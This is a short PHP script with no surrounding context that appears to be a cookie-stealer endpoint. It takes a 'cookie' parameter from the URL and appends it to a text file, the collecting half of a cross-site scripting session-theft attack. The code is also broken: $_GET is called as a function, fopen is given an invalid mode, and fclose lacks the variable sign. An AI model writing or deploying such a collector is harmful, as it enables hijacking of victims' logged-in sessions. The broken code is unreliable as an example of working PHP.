<?php
$cookie=$_GET('cookie');
$f=fopen("cookiefile.txt","s");
fwrite($f,$cookie);
fclose(f);
?>

